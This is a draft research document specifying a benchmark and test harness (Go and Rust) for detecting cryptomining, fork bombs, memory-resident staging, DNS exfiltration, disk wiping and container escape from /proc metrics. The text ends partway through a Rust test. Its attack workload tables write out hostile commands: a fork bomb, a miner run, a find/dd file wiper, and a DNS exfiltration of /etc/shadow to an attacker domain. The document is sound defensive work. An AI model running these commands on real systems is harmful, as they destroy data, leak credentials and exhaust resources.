---
title: "09 -- Empirical Infrastructure Signal Validation"
series: Sentinel Convergence (supplemental)
version: "0.1"
date: 2026-04-07
status: Draft
authors: Swarm Team Six Research / AQ Stack
---

# 09 -- Empirical Infrastructure Signal Validation

> **Scope**: Concrete benchmark corpus, measurement framework, test harness
> design, synthetic /proc data, expected baseline calculations, resource cost
> measurement, and pass/fail evaluation criteria for the infrastructure-signal
> detection hypothesis described in
> [02-PREDICTIVE-FAILURE-AS-THREAT-SIGNAL.md](02-PREDICTIVE-FAILURE-AS-THREAT-SIGNAL.md)
> and [05-TELEMETRY-BRIDGE-ARCHITECTURE.md](05-TELEMETRY-BRIDGE-ARCHITECTURE.md).

> **Motivation**: Docs 02 and 05 contain estimated numbers (Section 12 of Doc
> 02 explicitly labels its values as "design targets and validation
> hypotheses"). This document defines a reproducible experimental protocol for
> replacing those estimates with measurements. Every step is grounded in a
> specific file, function, data format, or threshold from the Sentinel and
> swarm-team-six codebases.

---

## Table of Contents

1. [Benchmark Corpus Design](#1-benchmark-corpus-design)
2. [Measurement Framework](#2-measurement-framework)
3. [Test Harness Design](#3-test-harness-design)
4. [Synthetic /proc Corpus](#4-synthetic-proc-corpus)
5. [Expected Baselines](#5-expected-baselines)
6. [Resource Cost Measurement](#6-resource-cost-measurement)
7. [Evaluation Criteria](#7-evaluation-criteria)
8. [Execution Plan](#8-execution-plan)
9. [Cross-References](#cross-references)

---

## 1. Benchmark Corpus Design

Each workload is defined by: (a) what it does, (b) how to generate it in a
reproducible container, (c) which /proc and /sys metrics it perturbs, and (d)
the ground-truth label (benign or attack).

### 1.1 Benign Workloads

#### B1: Linux Kernel Compilation

| Property | Value |
|---|---|
| **Description** | Parallel `make -j$(nproc)` of the Linux kernel source tree |
| **Container image** | `docker.io/library/gcc:13-bookworm` |
| **Setup** | `curl -sL https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.8.tar.xz \| tar xJ` |
| **Execution** | `cd linux-6.8 && make defconfig && make -j$(nproc)` |
| **Duration** | 10-30 min depending on core count |
| **Expected /proc signature** | CPU usage 85-100%, load average = nproc, memory 40-70% (compiler + linker RSS), thermal 60-80C on edge ARM, disk I/O moderate (object file writes), network near-zero |
| **Ground truth** | BENIGN |
| **Key risk**: FP as cryptominer (high CPU + thermal) |

#### B2: PostgreSQL OLTP Benchmark

| Property | Value |
|---|---|
| **Description** | pgbench TPC-B-like workload against a local PostgreSQL instance |
| **Container image** | `docker.io/library/postgres:16-bookworm` |
| **Setup** | `pgbench -i -s 100 bench` (initialize 100 scale-factor database) |
| **Execution** | `pgbench -c 32 -j 8 -T 600 bench` (32 clients, 8 threads, 10 min) |
| **Duration** | 10 min |
| **Expected /proc signature** | CPU 30-60% (I/O bound), memory 50-70% (shared_buffers + connection buffers), disk I/O high (WAL writes + checkpoints), load average 4-8, network low (local connections) |
| **Ground truth** | BENIGN |
| **Key risk**: FP as ransomware (sustained disk I/O) |

#### B3: Nginx Static File Serving Under Load

| Property | Value |
|---|---|
| **Description** | `wrk` HTTP load generator against nginx serving 1KB-10MB static files |
| **Container image** | `docker.io/library/nginx:1.27-bookworm` + `docker.io/skandyla/wrk` |
| **Setup** | Generate 1000 random files in /usr/share/nginx/html (1KB, 10KB, 100KB, 1MB, 10MB) |
| **Execution** | `wrk -t4 -c100 -d600s http://localhost/` |
| **Duration** | 10 min |
| **Expected /proc signature** | CPU 20-50% (kernel network + sendfile), memory 30-50%, network TX high (content serving), disk I/O moderate (page cache hits), load average 2-6 |
| **Ground truth** | BENIGN |
| **Key risk**: FP as data exfiltration (sustained network TX) |

#### B4: Batch ETL Processing

| Property | Value |
|---|---|
| **Description** | Python pandas/numpy pipeline: read CSV, transform, aggregate, write Parquet |
| **Container image** | `docker.io/library/python:3.12-bookworm` |
| **Setup** | `pip install pandas pyarrow numpy && python generate_data.py --rows 10000000` |
| **Execution** | `python etl_pipeline.py --input data.csv --output result.parquet` |
| **Duration** | 5-15 min |
| **Expected /proc signature** | CPU 60-90% (single-threaded NumPy bursts), memory 50-80% (DataFrame in RAM), disk I/O bursty (read CSV, write Parquet), load average 1-2, network zero |
| **Ground truth** | BENIGN |
| **Key risk**: FP as memory-resident malware (high steady-state memory) |

### 1.2 Attack-Like Workloads

#### A1: Monero Cryptominer (XMRig)

| Property | Value |
|---|---|
| **Description** | XMRig RandomX CPU miner running at full capacity |
| **Container image** | Custom: `FROM ubuntu:22.04 + build XMRig 6.21.0 from source` |
| **Execution** | `xmrig --no-color --cpu-max-threads-hint=100 --donate-level=0 --url=stratum+tcp://127.0.0.1:3333 --user=test --pass=x` (point at a dummy stratum, miner still hashes) |
| **Duration** | 10 min |
| **Expected /proc signature** | CPU 95-100%, load average >> nproc (RandomX uses all threads + hyperthreads), thermal 80-95C (sustained full load), memory 30-40% (256MB per RandomX dataset), disk I/O near-zero, network low (periodic stratum protocol, <1KB/s) |
| **Ground truth** | ATTACK -- T1496 Resource Hijacking |
| **Distinguisher from B1**: No disk I/O (compiler writes objects), load z-score stays extremely high for duration (compilation varies), thermal rises monotonically |

#### A2: Fork Bomb

| Property | Value |
|---|---|
| **Description** | Controlled fork bomb that spawns processes up to cgroup PID limit |
| **Container image** | `docker.io/library/busybox:1.37` |
| **Execution** | `sh -c 'bomb() { bomb | bomb & }; bomb'` inside a container with `--pids-limit=4096` and `--memory=512m` |
| **Duration** | Until OOM-killed (typically 10-30s) |
| **Expected /proc signature** | CPU 100% (scheduler overhead), load average spikes to >100 (thousands of runnable processes), memory ramps to limit then OOM kills, OOM kill count increments, thermal spike, disk I/O low, network zero |
| **Ground truth** | ATTACK -- T1499.001 Endpoint DoS |
| **Distinguisher from B1**: OOM kill count increase (compiler never OOMs on defconfig), load average z-score >> 3 within seconds, memory ramp slope > 10%/s |

#### A3: Memory-Resident Payload (Fileless)

| Property | Value |
|---|---|
| **Description** | Process that allocates and touches large memory regions, simulating memory-resident malware staging |
| **Container image** | `docker.io/library/gcc:13-bookworm` |
| **Setup** | Compile `memhog.c` (below) |
| **Execution** | `./memhog --rate 50 --target 90` (allocate 50MB/s until 90% memory usage) |
| **Source (memhog.c)** | Allocates pages with `mmap(MAP_ANONYMOUS\|MAP_POPULATE)`, touches them to ensure RSS, holds indefinitely |
| **Duration** | Until target memory reached (2-5 min), then hold for 10 min |
| **Expected /proc signature** | CPU 5-15% (mmap + touch overhead), memory ramps linearly 50MB/s until 90%, swap pressure if over physical, load average 1-2, thermal low, disk I/O low (no file backing), network zero |
| **Ground truth** | ATTACK -- T1055 Process Injection (simulated staging) |
| **Distinguisher from B4**: Memory grows monotonically (ETL has plateau after load), no disk I/O (ETL reads/writes files), CPU much lower (ETL bursts to 90%) |

#### A4: Slow DNS Exfiltration

| Property | Value |
|---|---|
| **Description** | Data exfiltration via DNS TXT queries, encoding payload in subdomains |
| **Container image** | `docker.io/library/python:3.12-slim` |
| **Setup** | Custom Python script using `dnspython` library |
| **Execution** | `python dns_exfil.py --data /etc/shadow --chunk-size 63 --delay-ms 500 --server 10.0.0.53 --domain exfil.attacker.com` |
| **Duration** | 10-30 min depending on data size |
| **Expected /proc signature** | CPU <5%, memory <5%, disk I/O near-zero (one read of target file), network: small but steady TX (DNS queries ~100-300 bytes each at 2/s), network errors may elevate if DNS server rejects, load average <1, thermal normal |
| **Ground truth** | ATTACK -- T1048.003 Exfiltration Over DNS |
| **Note**: This is a **weak infrastructure signal** attack. Sentinel alone cannot reliably detect this; it requires the `DnsExfiltrationDetector` in swarm-whisker. We include it to measure the infrastructure-signal floor and validate the compound detection hypothesis. |

#### A5: Disk Wiper Pattern

| Property | Value |
|---|---|
| **Description** | Sequential overwrite of all files in a target directory with random data |
| **Container image** | `docker.io/library/ubuntu:22.04` |
| **Setup** | Create 10GB of test files: `dd if=/dev/urandom of=/data/fileN bs=1M count=100` for N in 1..100 |
| **Execution** | `find /data -type f -exec sh -c 'dd if=/dev/urandom of="{}" bs=4K conv=notrunc 2>/dev/null && sync' \;` |
| **Duration** | 5-15 min (I/O bound) |
| **Expected /proc signature** | CPU 20-40% (random number generation + write syscalls), memory 10-20%, disk I/O write bytes extremely high (sequential 4K random writes), disk I/O latency spikes (write queue saturation), disk usage may fluctuate, load average 1-3, network zero |
| **Ground truth** | ATTACK -- T1485 Data Destruction |
| **Distinguisher from B2**: Write-only I/O pattern (database has read+write), no network activity (database has connections), disk latency sustained high vs bursty checkpoints |

#### A6: Container Escape Sequence (Simulated)

| Property | Value |
|---|---|
| **Description** | Simulated container escape: rapid namespace probing, mount enumeration, kernel version checking, capability testing |
| **Container image** | `docker.io/library/ubuntu:22.04` with `--privileged` (controlled) |
| **Execution** | Script that: reads `/proc/1/cgroup`, probes `/proc/sysrq-trigger`, attempts to mount host filesystems, enumerates capabilities via `capsh --print`, reads `/proc/kallsyms`, attempts `nsenter` |
| **Duration** | 30-60s (rapid probe sequence) |
| **Expected /proc signature** | CPU spike 30-60% for 30s (rapid syscall sequence), load average spike 2-4, memory modest, disk I/O bursty (procfs reads), network zero (pre-exfil stage) |
| **Ground truth** | ATTACK -- T1611 Escape to Host |
| **Note**: Very short duration. Tests MTTD requirement. Infrastructure signal is moderate -- this relies more on process-tree detection but should produce detectable CPU/load spikes. |

---

## 2. Measurement Framework

### 2.1 Primary Metrics

| Metric | Definition | Collection Method |
|---|---|---|
| **TPR (True Positive Rate)** | P(alert \| attack) = TP / (TP + FN) | Count trials where predictor `FailureProbability > FailureProbabilityWarn` (0.3) during attack workload |
| **FPR (False Positive Rate)** | P(alert \| benign) = FP / (FP + TN) | Count trials where predictor `FailureProbability > FailureProbabilityWarn` (0.3) during benign workload |
| **MTTD (Mean Time to Detect)** | Average seconds from workload start to first prediction exceeding warn threshold | Timestamp of first `FailureProbability > 0.3` minus workload start time |
| **Pipeline Latency** | Time from /proc read to `Prediction` output | `Prediction.Timestamp - NodeMetrics.Timestamp` (Go) or `Instant::elapsed()` (Rust) |
| **Detector Overhead (CPU)** | CPU time consumed by the detection pipeline itself | Go: `runtime.ReadMemStats` + CPU profiling; Rust: `criterion` wall-clock |
| **Detector Overhead (Memory)** | RSS delta attributable to the detector | Go: `runtime.MemStats.HeapInUse`; Rust: peak RSS via `/proc/self/status` |

### 2.2 Per-Workload Measurement Protocol

For each workload (B1-B4, A1-A6), run the following protocol:

1. **Baseline phase** (5 minutes): Idle system. Collect 300 samples at 1 Hz.
   Sentinel's Predictor accumulates running statistics via Welford's algorithm
   (`updateStats` in `pkg/healthscore/predictor.go` line 137). This provides
   the statistical baseline against which anomalies are detected.

2. **Workload phase** (workload-specific duration): Start workload. Continue
   collecting at 1 Hz. Record the timestamp of every prediction that crosses
   the warn threshold (0.3) or critical threshold (0.7), per
   `DefaultThresholds()` in `predictor.go` line 71.

3. **Recovery phase** (5 minutes): Stop workload. Continue collecting. Verify
   predictions return below warn threshold. Measures whether the detector
   produces trailing false positives.

4. **Repeat N=30 trials** per workload to achieve statistical power (see
   Section 2.3).

### 2.3 Statistical Methodology

**Sample size justification**: For a binomial proportion (TPR or FPR), the
95% confidence interval half-width for N=30 trials is approximately:

```
CI = 1.96 * sqrt(p*(1-p)/N)

For p=0.95 (target TPR): CI = 1.96 * sqrt(0.95*0.05/30) = 0.078
For p=0.05 (target FPR): CI = 1.96 * sqrt(0.05*0.95/30) = 0.078
```

This gives us +/-7.8% precision, sufficient to distinguish >95% from <85% and
<5% from >15% with 95% confidence.

**Confidence intervals**: Report Wilson score intervals for proportions (better
coverage than Wald intervals at extreme p). For continuous metrics (MTTD,
latency), report mean +/- t-distribution CI with df=N-1.

**Significance testing**: McNemar's test for comparing paired TPR/FPR between
Sentinel-only and compound (Sentinel + swarm-whisker) detection. Wilcoxon
signed-rank test for MTTD comparisons.

### 2.4 Data Recording Format

Each trial produces a JSON-lines file:

```json
{"trial_id": "B1-001", "phase": "baseline", "sample_idx": 0, "timestamp_unix": 1712500000, "metrics": {"cpu_usage_percent": 2.1, "cpu_temperature_celsius": 42.0, "memory_usage_percent": 31.0, "load_average_1min": 0.5, ...}, "prediction": {"failure_probability": 0.02, "confidence": 0.8, "time_to_failure_seconds": -1, "reasons": []}}
{"trial_id": "B1-001", "phase": "workload", "sample_idx": 300, "timestamp_unix": 1712500300, "metrics": {"cpu_usage_percent": 97.0, ...}, "prediction": {"failure_probability": 0.45, ...}}
```

---

## 3. Test Harness Design

### 3.1 Architecture

The harness replays pre-recorded /proc snapshots through both Sentinel's
Predictor and a proposed swarm-whisker `InfrastructureAnomalyDetector`.
This avoids needing a live Linux system for reproducibility.

```
                  ┌─────────────────────────────────┐
                  │    Synthetic /proc Corpus        │
                  │    (JSON-lines, per-workload)    │
                  └────────────┬────────────────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                 ▼
     ┌────────────┐   ┌──────────────┐   ┌──────────────┐
     │  Go Test   │   │  Rust Test   │   │  Combined    │
     │  Harness   │   │  Harness     │   │  Evaluation  │
     │            │   │              │   │  (Python)    │
     │  Sentinel  │   │  swarm-      │   │              │
     │  Predictor │   │  whisker     │   │  TPR/FPR     │
     │  .Predict()│   │  .evaluate() │   │  MTTD calc   │
     └────────────┘   └──────────────┘   └──────────────┘
```

### 3.2 Go Test Harness (Sentinel Side)

This test uses Sentinel's existing mock /proc pattern from
`pkg/collector/collector_test.go` (line 85, `TestCollectWithMockProc`), which
creates a temp directory tree mimicking /proc and /sys and passes it via
`WithProcPath()` and `WithSysPath()` options.

The benchmark harness extends this by replaying a time series of snapshots:

```go
// File: pkg/healthscore/benchmark_infra_test.go
package healthscore

import (
    "context"
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
    "testing"
    "time"

    "github.com/aqstack/sentinel/pkg/collector"
)

// SyntheticSample represents one time step in a recorded workload.
type SyntheticSample struct {
    SampleIdx  int     `json:"sample_idx"`
    Phase      string  `json:"phase"` // "baseline" | "workload" | "recovery"
    ProcStat   string  `json:"proc_stat"`
    ProcMeminfo string `json:"proc_meminfo"`
    ProcLoadavg string `json:"proc_loadavg"`
    ProcVmstat  string `json:"proc_vmstat"`
    ProcDiskstats string `json:"proc_diskstats"`
    ProcNetDev  string `json:"proc_net_dev"`
    SysThermalTemp int64 `json:"sys_thermal_temp"` // millidegrees
    // Pre-computed NodeMetrics for direct predictor feeding
    Metrics    collector.NodeMetrics `json:"metrics"`
}

// WorkloadCorpus is a full workload recording.
type WorkloadCorpus struct {
    WorkloadID  string           `json:"workload_id"`
    GroundTruth string           `json:"ground_truth"` // "benign" | "attack"
    AttackType  string           `json:"attack_type,omitempty"`
    Samples     []SyntheticSample `json:"samples"`
}

// BenchmarkResult captures one trial's outcome.
type BenchmarkResult struct {
    WorkloadID         string    `json:"workload_id"`
    GroundTruth        string    `json:"ground_truth"`
    TrialNum           int       `json:"trial_num"`
    Detected           bool      `json:"detected"` // FailureProbability > warn threshold
    DetectionSampleIdx int       `json:"detection_sample_idx"` // -1 if not detected
    MTTD               float64   `json:"mttd_seconds"` // -1 if not detected
    PeakProbability    float64   `json:"peak_probability"`
    PeakConfidence     float64   `json:"peak_confidence"`
    Reasons            []string  `json:"reasons"`
    PredictionLatency  []float64 `json:"prediction_latency_us"`
}

// replayCorpusThroughPredictor feeds a workload corpus through Sentinel's
// Predictor and records detection outcomes.
func replayCorpusThroughPredictor(
    t *testing.T,
    corpus *WorkloadCorpus,
    thresholds *PredictionThresholds,
) *BenchmarkResult {
    t.Helper()

    if thresholds == nil {
        thresholds = DefaultThresholds()
    }
    pred := NewPredictor(corpus.WorkloadID, thresholds)

    result := &BenchmarkResult{
        WorkloadID:         corpus.WorkloadID,
        GroundTruth:        corpus.GroundTruth,
        DetectionSampleIdx: -1,
        MTTD:               -1,
    }

    ctx := context.Background()
    workloadStartIdx := -1

    for _, sample := range corpus.Samples {
        // Track when workload phase begins
        if sample.Phase == "workload" && workloadStartIdx == -1 {
            workloadStartIdx = sample.SampleIdx
        }

        // Feed sample into predictor history
        pred.AddSample(&sample.Metrics)

        // Run prediction
        start := time.Now()
        prediction, err := pred.Predict(ctx, &sample.Metrics)
        latencyUs := float64(time.Since(start).Microseconds())
        result.PredictionLatency = append(result.PredictionLatency, latencyUs)

        if err != nil {
            t.Logf("Predict() error at sample %d: %v", sample.SampleIdx, err)
            continue
        }

        // Track peak values
        if prediction.FailureProbability > result.PeakProbability {
            result.PeakProbability = prediction.FailureProbability
            result.Reasons = prediction.Reasons
        }
        if prediction.Confidence > result.PeakConfidence {
            result.PeakConfidence = prediction.Confidence
        }

        // Check for detection (first time crossing warn threshold during workload)
        if !result.Detected &&
            sample.Phase == "workload" &&
            prediction.FailureProbability > thresholds.FailureProbabilityWarn {
            result.Detected = true
            result.DetectionSampleIdx = sample.SampleIdx
            if workloadStartIdx >= 0 {
                // At 1 Hz sampling, sample index difference = seconds
                result.MTTD = float64(sample.SampleIdx - workloadStartIdx)
            }
        }
    }

    return result
}

// TestBenchmarkCorpusReplay is the top-level benchmark test.
// It loads all corpus files from testdata/benchmark/ and replays them.
func TestBenchmarkCorpusReplay(t *testing.T) {
    corpusDir := filepath.Join("testdata", "benchmark")
    entries, err := os.ReadDir(corpusDir)
    if err != nil {
        t.Skipf("No benchmark corpus at %s: %v", corpusDir, err)
    }

    for _, entry := range entries {
        if filepath.Ext(entry.Name()) != ".json" {
            continue
        }
        t.Run(entry.Name(), func(t *testing.T) {
            data, err := os.ReadFile(filepath.Join(corpusDir, entry.Name()))
            if err != nil {
                t.Fatalf("Failed to read corpus: %v", err)
            }
            var corpus WorkloadCorpus
            if err := json.Unmarshal(data, &corpus); err != nil {
                t.Fatalf("Failed to parse corpus: %v", err)
            }

            result := replayCorpusThroughPredictor(t, &corpus, nil)

            // Log result
            resultJSON, _ := json.MarshalIndent(result, "", "  ")
            t.Logf("Result:\n%s", resultJSON)

            // Validate ground-truth consistency
            if corpus.GroundTruth == "attack" && !result.Detected {
                t.Errorf("MISS: attack workload %s not detected (peak prob=%.3f)",
                    corpus.WorkloadID, result.PeakProbability)
            }
            if corpus.GroundTruth == "benign" && result.Detected {
                t.Errorf("FALSE POSITIVE: benign workload %s triggered detection (peak prob=%.3f)",
                    corpus.WorkloadID, result.PeakProbability)
            }
        })
    }
}

// BenchmarkPredictorThroughput measures prediction throughput on synthetic data.
func BenchmarkPredictorThroughput(b *testing.B) {
    pred := NewPredictor("bench-node", nil)

    // Prime with 100 baseline samples
    for i := 0; i < 100; i++ {
        pred.AddSample(&collector.NodeMetrics{
            CPUTemperature:     45.0,
            CPUUsagePercent:    25.0,
            MemoryTotalBytes:   8 * 1024 * 1024 * 1024,
            MemoryUsagePercent: 40.0,
            LoadAverage1Min:    1.0,
            LoadAverage5Min:    1.0,
            LoadAverage15Min:   1.0,
            DiskTotalBytes:     100 * 1024 * 1024 * 1024,
            DiskUsagePercent:   50.0,
            NetworkRxBytes:     1024 * 1024,
            NetworkTxBytes:     512 * 1024,
            NetworkLatencyMs:   5.0,
        })
    }

    current := &collector.NodeMetrics{
        CPUTemperature:     75.0,
        CPUUsagePercent:    95.0,
        MemoryTotalBytes:   8 * 1024 * 1024 * 1024,
        MemoryUsagePercent: 85.0,
        LoadAverage1Min:    12.0,
        LoadAverage5Min:    8.0,
        LoadAverage15Min:   4.0,
        DiskTotalBytes:     100 * 1024 * 1024 * 1024,
        DiskUsagePercent:   75.0,
        DiskIOReadBytes:    50 * 1024 * 1024,
        DiskIOWriteBytes:   20 * 1024 * 1024,
        DiskIOLatencyMs:    15.0,
        NetworkRxBytes:     10 * 1024 * 1024,
        NetworkTxBytes:     5 * 1024 * 1024,
        NetworkLatencyMs:   25.0,
    }

    ctx := context.Background()
    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        pred.AddSample(current)
        _, err := pred.Predict(ctx, current)
        if err != nil {
            b.Fatal(err)
        }
    }
}

// BenchmarkPredictorMemory measures memory footprint at maxHistory.
func BenchmarkPredictorMemory(b *testing.B) {
    b.ReportAllocs()
    for i := 0; i < b.N; i++ {
        pred := NewPredictor("mem-bench", nil)
        for j := 0; j < 1000; j++ {
            pred.AddSample(&collector.NodeMetrics{
                CPUTemperature:     45.0 + float64(j%30)*0.5,
                CPUUsagePercent:    20.0 + float64(j%60),
                MemoryTotalBytes:   8 * 1024 * 1024 * 1024,
                MemoryUsagePercent: 30.0 + float64(j%50),
                LoadAverage1Min:    1.0 + float64(j%10)*0.2,
            })
        }
    }
}
```

### 3.3 Rust Test Harness (swarm-whisker Side)

This harness implements the proposed `InfrastructureAnomalyDetector` following
the `DetectionStrategy` trait pattern from `swarm-whisker/src/detector.rs`
(line 17) and the `TelemetryEvent` / `TelemetryPayload` types from
`swarm-core/src/telemetry.rs`.

The proposed `InfrastructureHealth` payload variant does not yet exist in
`swarm-core`. The harness uses `TelemetryPayload::ProcessStart` as a carrier
with a sentinel-specific marker, or -- more cleanly -- adds the proposed
variant behind a feature flag:

```rust
// File: crates/swarm-whisker/src/infrastructure_anomaly.rs (proposed)
// This module is gated behind #[cfg(feature = "sentinel")] until the
// TelemetryPayload::InfrastructureHealth variant is added to swarm-core.

use crate::detector::{DetectionFinding, DetectionStrategy, TelemetryEvent, TelemetryPayload};
use crate::{ProfileValidationError, validate_confidence_thresholds};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::sync::Mutex;
use swarm_core::pheromone::ThreatClass;
use swarm_core::types::Severity;

/// Welford's online mean/variance accumulator (Rust port of Sentinel's
/// updateMeanStd from pkg/healthscore/predictor.go line 152).
#[derive(Debug, Clone, Default)]
pub struct WelfordAccumulator {
    pub n: u64,
    pub mean: f64,
    pub m2: f64,
}

impl WelfordAccumulator {
    pub fn update(&mut self, value: f64) {
        self.n += 1;
        let delta = value - self.mean;
        self.mean += delta / self.n as f64;
        let delta2 = value - self.mean;
        self.m2 += delta * delta2;
    }

    pub fn variance(&self) -> f64 {
        if self.n < 2 {
            return 0.0;
        }
        self.m2 / self.n as f64
    }

    pub fn std_dev(&self) -> f64 {
        self.variance().sqrt()
    }

    pub fn z_score(&self, value: f64) -> f64 {
        let sd = self.std_dev();
        if sd < f64::EPSILON {
            return 0.0;
        }
        (value - self.mean) / sd
    }
}

/// Infrastructure metrics snapshot (mirrors Sentinel's NodeMetrics).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InfraMetricsSnapshot {
    pub cpu_temperature_celsius: f64,
    pub cpu_usage_percent: f64,
    pub cpu_throttled: bool,
    pub load_average_1min: f64,
    pub memory_total_bytes: u64,
    pub memory_usage_percent: f64,
    pub oom_kill_count: u64,
    pub swap_total_bytes: u64,
    pub swap_used_bytes: u64,
    pub disk_total_bytes: u64,
    pub disk_usage_percent: f64,
    pub disk_io_read_bytes: u64,
    pub disk_io_write_bytes: u64,
    pub disk_io_latency_ms: f64,
    pub network_rx_bytes: u64,
    pub network_tx_bytes: u64,
    pub network_rx_errors: u64,
    pub network_tx_errors: u64,
    pub network_latency_ms: f64,
}

/// Per-node running statistics.
#[derive(Debug, Clone, Default)]
struct NodeStats {
    samples: usize,
    cpu_temp: WelfordAccumulator,
    cpu_usage: WelfordAccumulator,
    mem_usage: WelfordAccumulator,
    load_avg: WelfordAccumulator,
    history: Vec<InfraMetricsSnapshot>,
}

/// Detector that evaluates infrastructure metrics for security anomalies.
/// Implements the same risk-weight model as Sentinel's Predictor
/// (predictor.go line 211-309) but with compound rule matching
/// for threat classification.
pub struct InfrastructureAnomalyDetector {
    min_samples: usize,
    thermal_critical: f64,
    cpu_critical: f64,
    memory_critical: f64,
    zscore_critical: f64,
    node_state: Mutex<HashMap<String, NodeStats>>,
    high_confidence_threshold: f64,
    medium_confidence_threshold: f64,
}

impl Default for InfrastructureAnomalyDetector {
    fn default() -> Self {
        Self {
            min_samples: 30,
            thermal_critical: 85.0,
            cpu_critical: 95.0,
            memory_critical: 95.0,
            zscore_critical: 3.0,
            node_state: Mutex::new(HashMap::new()),
            high_confidence_threshold: 0.85,
            medium_confidence_threshold: 0.60,
        }
    }
}

impl InfrastructureAnomalyDetector {
    /// Evaluate an infrastructure metrics snapshot for a given node.
    /// Returns findings classified by threat type.
    pub fn evaluate_infra(
        &self,
        node_name: &str,
        event_id: &str,
        snapshot: &InfraMetricsSnapshot,
    ) -> Vec<DetectionFinding> {
        let mut guard = self
            .node_state
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        let stats = guard.entry(node_name.to_string()).or_default();

        // Update running statistics
        stats.cpu_temp.update(snapshot.cpu_temperature_celsius);
        stats.cpu_usage.update(snapshot.cpu_usage_percent);
        stats.mem_usage.update(snapshot.memory_usage_percent);
        stats.load_avg.update(snapshot.load_average_1min);
        stats.samples += 1;

        // Bound history
        stats.history.push(snapshot.clone());
        if stats.history.len() > 1000 {
            stats.history.drain(..stats.history.len() - 1000);
        }

        if stats.samples < self.min_samples {
            return Vec::new();
        }

        let mut findings = Vec::new();

        // Compound rule: CRYPTOMINER_SIGNATURE
        let cpu_high = snapshot.cpu_usage_percent > self.cpu_critical;
        let thermal_high = snapshot.cpu_temperature_celsius > self.thermal_critical;
        let load_anomaly = stats.load_avg.z_score(snapshot.load_average_1min)
            > self.zscore_critical;
        let disk_io_low = snapshot.disk_io_write_bytes < 10 * 1024 * 1024; // <10MB/s

        if (cpu_high || load_anomaly) && (thermal_high || snapshot.cpu_throttled) && disk_io_low {
            findings.push(DetectionFinding {
                finding_id: format!("infra_crypto:{event_id}"),
                event_id: event_id.to_string(),
                threat_class: ThreatClass::Execution,
                severity: Severity::Critical,
                confidence: self.high_confidence_threshold,
                evidence: json!({
                    "rule": "CRYPTOMINER_SIGNATURE",
                    "cpu_usage": snapshot.cpu_usage_percent,
                    "temperature": snapshot.cpu_temperature_celsius,
                    "load_zscore": stats.load_avg.z_score(snapshot.load_average_1min),
                    "disk_io_write": snapshot.disk_io_write_bytes,
                }),
                strategy_id: "infrastructure_anomaly".to_string(),
            });
        }

        // Compound rule: FORK_BOMB_SIGNATURE
        let mem_critical = snapshot.memory_usage_percent > self.memory_critical;
        let oom_increasing = stats.history.len() >= 2
            && snapshot.oom_kill_count
                > stats.history[stats.history.len() - 2].oom_kill_count;

        if (mem_critical || oom_increasing) && load_anomaly && cpu_high {
            findings.push(DetectionFinding {
                finding_id: format!("infra_forkbomb:{event_id}"),
                event_id: event_id.to_string(),
                threat_class: ThreatClass::Impact,
                severity: Severity::Critical,
                confidence: self.high_confidence_threshold,
                evidence: json!({
                    "rule": "FORK_BOMB_SIGNATURE",
                    "memory_usage": snapshot.memory_usage_percent,
                    "oom_increasing": oom_increasing,
                    "load_zscore": stats.load_avg.z_score(snapshot.load_average_1min),
                }),
                strategy_id: "infrastructure_anomaly".to_string(),
            });
        }

        // Compound rule: DISK_WIPER_SIGNATURE
        let disk_io_critical = snapshot.disk_io_latency_ms > 100.0;
        let disk_write_heavy = snapshot.disk_io_write_bytes > 50 * 1024 * 1024;
        let network_quiet = snapshot.network_tx_bytes < 1024 * 1024;

        if disk_io_critical && disk_write_heavy && network_quiet {
            findings.push(DetectionFinding {
                finding_id: format!("infra_wiper:{event_id}"),
                event_id: event_id.to_string(),
                threat_class: ThreatClass::Impact,
                severity: Severity::High,
                confidence: self.medium_confidence_threshold,
                evidence: json!({
                    "rule": "DISK_WIPER_SIGNATURE",
                    "disk_io_latency_ms": snapshot.disk_io_latency_ms,
                    "disk_io_write_bytes": snapshot.disk_io_write_bytes,
                    "network_tx_bytes": snapshot.network_tx_bytes,
                }),
                strategy_id: "infrastructure_anomaly".to_string(),
            });
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn baseline_snapshot() -> InfraMetricsSnapshot {
        InfraMetricsSnapshot {
            cpu_temperature_celsius: 45.0,
            cpu_usage_percent: 25.0,
            cpu_throttled: false,
            load_average_1min: 1.0,
            memory_total_bytes: 8 * 1024 * 1024 * 1024,
            memory_usage_percent: 40.0,
            oom_kill_count: 0,
            swap_total_bytes: 2 * 1024 * 1024 * 1024,
            swap_used_bytes: 0,
            disk_total_bytes: 100 * 1024 * 1024 * 1024,
            disk_usage_percent: 50.0,
            disk_io_read_bytes: 1024 * 1024,
            disk_io_write_bytes: 512 * 1024,
            disk_io_latency_ms: 5.0,
            network_rx_bytes: 1024 * 1024,
            network_tx_bytes: 512 * 1024,
            network_rx_errors: 0,
            network_tx_errors: 0,
            network_latency_ms: 5.0,
        }
    }

    #[test]
    fn cryptominer_detected_after_baseline() {
        let detector = InfrastructureAnomalyDetector::default();

        // Feed 50 baseline samples
        for i in 0..50 {
            let snap = baseline_snapshot();
            let findings = detector.evaluate_infra(
                "node-1",
                &format!("baseline-{i}"),
                &snap,
            );
            assert!(findings.is_empty(), "baseline should not trigger");
        }

        // Feed cryptominer snapshot
        let attack = InfraMetricsSnapshot {
            cpu_temperature_celsius: 90.0,
            cpu_usage_percent: 99.0,
            cpu_throttled: true,
            load_average_1min: 16.0, // way above baseline of 1.0
            disk_io_write_bytes: 1024, // near-zero writes
            ..baseline_snapshot()
        };

        let findings = detector.evaluate_infra("node-1", "attack-0", &attack);
        assert!(!findings.is_empty(), "cryptominer should be detected");
        assert_eq!(findings[0].threat_class, ThreatClass::Execution);
    }

    #[test]
    fn benign_compilation_not_flagged_as_miner() {
        let detector = InfrastructureAnomalyDetector::default();

        // Baseline
        for i in 0..50 {
            detector.evaluate_infra("node-1", &format!("b-{i}"), &baseline_snapshot());
        }

        // Compilation: high CPU but also high disk I/O (object file writes)
        let compilation = InfraMetricsSnapshot {
            cpu_temperature_celsius: 72.0,
            cpu_usage_percent: 92.0,
            cpu_throttled: false,
            load_average_1min: 8.0,
            disk_io_write_bytes: 50 * 1024 * 1024, // 50MB/s object writes
            disk_io_latency_ms: 15.0,
            ..baseline_snapshot()
        };

